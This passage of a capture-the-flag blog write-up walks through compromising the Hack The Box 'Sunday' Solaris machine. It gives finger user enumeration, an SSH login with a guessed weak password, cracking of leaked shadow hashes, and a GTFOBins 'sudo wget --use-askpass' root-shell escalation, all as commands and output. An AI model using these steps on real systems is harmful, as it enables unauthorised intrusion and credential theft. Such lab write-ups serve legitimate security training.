</span></span><span class=line><span class=cl>22022/tcp open  ssh      syn-ack ttl <span class=m>63</span> OpenSSH 7.5 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsG4q9TS6eAOrX6zI+R0CMMkCTfS36QDqQW5NcF/v9vmNWyL6xSZ8x38AB2T+Kbx672RqYCtKmHcZMFs55Q3hoWQE7YgWOJhXw9agE3aIjXiWCNhmmq4T5+zjbJWbF4OLkHzNzZ2qGHbhQD9Kbw9AmyW8ZS+P8AGC5fO36AVvgyS8+5YbA05N3UDKBbQu/WlpgyLfuNpAq9279mfq/MUWWRNKGKICF/jRB3lr2BMD+BhDjTooM7ySxpq7K9dfOgdmgqFrjdE4bkxBrPsWLF41YQy3hV0L/MJQE2h+s7kONmmZJMl4lAZ8PNUqQe6sdkDhL1Ex2+yQlvbyqQZw3xhuJ
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/0DH8qZiCfAzZNkSaAmT39TyBUFFwjdk8vm7ze+Wwm
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port79-TCP:V<span class=o>=</span>7.94%I<span class=o>=</span>7%D<span class=o>=</span>8/31%Time<span class=o>=</span>64F0B5E8%P<span class=o>=</span>arm-apple-darwin22.4.0%r<span class=o>(</span>G
</span></span><span class=line><span class=cl>SF:enericLines,12,<span class=s2>&#34;No\x20one\x20logged\x20on\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>GetRequest,93,<span class=s2>&#34;Login\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?
</span></span></span><span class=line><span class=cl><span class=s2>SF:\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\?\?\?\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Help,5D,<span class=s2>&#34;Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHE
</span></span></span><span class=line><span class=cl><span class=s2>SF:LP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\?\?\?\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>HTTPOptions,93,<span class=s2>&#34;Login\x20\x20\x20\x20\x20\x20\x20Name
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Whe
</span></span></span><span class=line><span class=cl><span class=s2>SF:re\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>RTSPRequest,93,<span class=s2>&#34;Login\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n&#34;</span><span class=o>)</span>%r
</span></span><span class=line><span class=cl>SF:<span class=o>(</span>SSLSessionReq,5D,<span class=s2>&#34;Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\?\?\?\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>TerminalServerCookie,5D,<span class=s2>&#34;Login\x20\x20\x20\x20\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span></code></pre></div><p>As we can see, there are 5 open ports. Port <strong>79</strong> is for <strong>finger?</strong>, port <strong>111</strong> is a <strong>rpc</strong>, port <strong>515</strong> is running <strong>printer</strong>, <strong>6787</strong> is a <strong>ssl</strong> port and finally <strong>22022</strong> is a <strong>ssh</strong> port.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p><img loading=lazy src=/HTB/sunday-1.png alt=Untitled></p><p>Navigating the website we can see a <strong>Oracle Solaris Dashboard</strong> asking for credentials.</p><p>As we don’t have any credentials, I tried to fuzz the page without succeed.</p><p>So I decide to enumerate other interesting ports.</p><p>First I start with <strong>finger?</strong> which is a user information lookup command which gives details of all the users logged in**.**</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc 10.10.10.76 <span class=m>79</span>
</span></span></code></pre></div><p>Once connected to the port via <strong>nc</strong> I attempted to list the users with the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>@10.10.10.76
</span></span></code></pre></div><p>But the program answers with the next error <code>Finger forwarding service denied.</code></p><p>When we try, instead of listing users, to put a valid username like <strong>root</strong> the program gives us info about it so I decided to try to brute force usernames.</p><p><img loading=lazy src=/HTB/sunday-2.png alt=Untitled></p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p>Googling for a finger enumerator exploit I found a <strong>HackTricks</strong> write up which talks about the finger command where we can find a link to a github project called <a href=https://pentestmonkey.net/tools/user-enumeration/finger-user-enum>finger-user-enum</a> which is an alternative for listing users.</p><p>I have executed it with the following command with a <strong>username wordlist</strong> located at <strong>SecLists</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./finger-user-enum.pl -U ~/Documents/wordlists/SecLists/Usernames/Names/names.txt -t 10.10.10.76
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>access@10.10.10.76: access No Access User                     &lt; .  .  .  . &gt;..nobody4  SunOS 4.x NFS Anonym               &lt; .  .  .  . &gt;..
</span></span><span class=line><span class=cl>admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              &lt; .  .  .  . &gt;..dladm    Datalink Admin                     &lt; .  .  .  . &gt;..netadm   Network Admin                      &lt; .  .  .  . &gt;..netcfg   Network Configuratio               &lt; .  .  .  . &gt;..dhcpserv DHCP Configuration A               &lt; .  .  .  . &gt;..ikeuser  IKE Admin                          &lt; .  .  .  . &gt;..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..
</span></span><span class=line><span class=cl>anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
</span></span><span class=line><span class=cl>bin@10.10.10.76: bin             ???                         &lt; .  .  .  . &gt;..
</span></span><span class=line><span class=cl>dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
</span></span><span class=line><span class=cl>ike@10.10.10.76: ikeuser  IKE Admin                          &lt; .  .  .  . &gt;..
</span></span><span class=line><span class=cl>jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
</span></span><span class=line><span class=cl>la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
</span></span><span class=line><span class=cl>line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..
</span></span><span class=line><span class=cl>message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               &lt; .  .  .  . &gt;..
</span></span><span class=line><span class=cl>miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
</span></span><span class=line><span class=cl>root@10.10.10.76: root     Super-User            console      &lt;Oct 14, 2022&gt;..
</span></span><span class=line><span class=cl>sammy@10.10.10.76: sammy           ???            ssh          &lt;Apr 13, 2022&gt; 10.10.14.13         ..
</span></span><span class=line><span class=cl>sunny@10.10.10.76: sunny           ???            ssh          &lt;Apr 13, 2022&gt; 10.10.14.13         ..
</span></span><span class=line><span class=cl>sys@10.10.10.76: sys             ???                         &lt; .  .  .  . &gt;..
</span></span><span class=line><span class=cl>zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
</span></span></code></pre></div><p>Removing all the thrash we have three possible valid usernames <strong>sammy</strong> and <strong>sunny</strong>.</p><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p>Before trying to bruteforce, I attempted common passwords in order to log in and I found one valid combination <strong>sunny/sunday</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -p <span class=m>22022</span> username@10.10.10.76
</span></span></code></pre></div><p><img loading=lazy src=/HTB/sunday-3.png alt=Untitled></p><p>In our home directory there is no flag (we need to <strong>privEsc</strong>) but we can see the <code>.bash_history</code> which is not empty</p><p><img loading=lazy src=/HTB/sunday-4.png alt=Untitled></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>su -
</span></span><span class=line><span class=cl>su -
</span></span><span class=line><span class=cl>cat /etc/resolv.conf
</span></span><span class=line><span class=cl>su -
</span></span><span class=line><span class=cl>ps auxwww<span class=p>|</span>grep overwrite
</span></span><span class=line><span class=cl>su -
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>sudo /root/troll
</span></span><span class=line><span class=cl>ls /backup
</span></span><span class=line><span class=cl>ls -l /backup
</span></span><span class=line><span class=cl>cat /backup/shadow.backup
</span></span><span class=line><span class=cl>sudo /root/troll
</span></span><span class=line><span class=cl>sudo /root/troll
</span></span><span class=line><span class=cl>su -
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>sudo /root/troll
</span></span><span class=line><span class=cl>ps auxwww
</span></span><span class=line><span class=cl>ps auxwww
</span></span><span class=line><span class=cl>ps auxwww
</span></span><span class=line><span class=cl>top
</span></span><span class=line><span class=cl>top
</span></span><span class=line><span class=cl>top
</span></span><span class=line><span class=cl>ps auxwww<span class=p>|</span>grep overwrite
</span></span><span class=line><span class=cl>su -
</span></span><span class=line><span class=cl>su -
</span></span><span class=line><span class=cl>cat /etc/resolv.conf
</span></span><span class=line><span class=cl>ps auxwww<span class=p>|</span>grep over
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>sudo /root/troll
</span></span><span class=line><span class=cl>sudo /root/troll
</span></span><span class=line><span class=cl>sudo /root/troll
</span></span><span class=line><span class=cl>sudo /root/troll
</span></span></code></pre></div><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>We can see some commands which may have been executed by <strong>sunny</strong>.</p><p>One of them is pretty interesting <code>sudo /root/troll</code> if we made <strong>sudo -l</strong> we can see that is the only command we can execute as sudo without password.</p><p><img loading=lazy src=/HTB/sunday-5.png alt=Untitled></p><p>Once executed shows a <strong>id</strong> output as root but the name makes me think that is only a script printing the root id output.</p><p>If we return to the <code>.bash_history</code> we can see other command which is consulting a backup.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /backup/shadow.backup
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mysql:NP:::::::
</span></span><span class=line><span class=cl>openldap:*LK*:::::::
</span></span><span class=line><span class=cl>webservd:*LK*:::::::
</span></span><span class=line><span class=cl>postgres:NP:::::::
</span></span><span class=line><span class=cl>svctag:*LK*:6445::::::
</span></span><span class=line><span class=cl>nobody:*LK*:6445::::::
</span></span><span class=line><span class=cl>noaccess:*LK*:6445::::::
</span></span><span class=line><span class=cl>nobody4:*LK*:6445::::::
</span></span><span class=line><span class=cl>sammy:<span class=nv>$5$Ebkn8jlK$i6SSPa0</span>.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
</span></span><span class=line><span class=cl>sunny:<span class=nv>$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3</span>:17636::::::
</span></span></code></pre></div><p>The file is <strong>passwd backup file</strong> with two password leaked but hashed so I decided to crack <strong>summy</strong> password with john.</p><p>Once cracked we have the next password <code>cooldude!</code></p><p><img loading=lazy src=/HTB/sunday-6.png alt=Untitled></p><p>Perfect we are logged as <strong>summy</strong>, let’s check his home directory for a flag.</p><p><img loading=lazy src=/HTB/sunday-7.png alt=Untitled></p><p>By id we can see that <strong>summy</strong> doesn’t have root permissions, so we need to <strong>privEsc</strong>.</p><p>Checking the <strong>sudo</strong> commands with the next command</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo -l
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>User sammy may run the following commands on sunday:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> ALL
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/wget
</span></span></code></pre></div><p>We can see that we are able to execute <strong>wget</strong> without password as <strong>sudo</strong>.</p><p>In the <strong>GTFOBins</strong> website there is one list of commands which help us to privEsc.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>TF</span><span class=o>=</span><span class=k>$(</span>mktemp<span class=k>)</span>
</span></span><span class=line><span class=cl>chmod +x <span class=nv>$TF</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s1>&#39;#!/bin/sh\n/bin/sh 1&gt;&amp;0&#39;</span> &gt;<span class=nv>$TF</span>
</span></span><span class=line><span class=cl>sudo wget --use-askpass<span class=o>=</span><span class=nv>$TF</span> <span class=m>0</span>
</span></span></code></pre></div><p><img loading=lazy src=/HTB/sunday-8.png alt=Untitled></p><p>We are <strong>root</strong> 😎</p><p><img loading=lazy src=/HTB/sunday-9.png alt=Untitled></p><p><strong>Thank you for reading, and happy hacking! 😄</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/privesc/>privesc</a></li><li><a href=https://pwndside.github.io/tags/web/>web</a></li><li><a href=https://pwndside.github.io/tags/linux/>linux</a></li><li><a href=https://pwndside.github.io/tags/ssh/>ssh</a></li></ul><nav class=paginav><a class=next href=https://pwndside.github.io/posts/poison-htb/><span class=title>Next »</span><br><span>Poison</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Sunday on twitter" href="https://twitter.com/intent/tweet/?text=Sunday&amp;url=https%3a%2f%2fpwndside.github.io%2fposts%2fsunday-htb%2f&amp;hashtags=privesc%2cweb%2clinux%2cssh"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sunday on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpwndside.github.io%2fposts%2fsunday-htb%2f&amp;title=Sunday&amp;summary=Sunday&amp;source=https%3a%2f%2fpwndside.github.io%2fposts%2fsunday-htb%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sunday on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fpwndside.github.io%2fposts%2fsunday-htb%2f&title=Sunday"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sunday on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fpwndside.github.io%2fposts%2fsunday-htb%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sunday on whatsapp" href="https://api.whatsapp.com/send?text=Sunday%20-%20https%3a%2f%2fpwndside.github.io%2fposts%2fsunday-htb%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sunday on telegram" href="https://telegram.me/share/url?text=Sunday&amp;url=https%3a%2f%2fpwndside.github.io%2fposts%2fsunday-htb%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://pwndside.github.io/>PwndSide</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>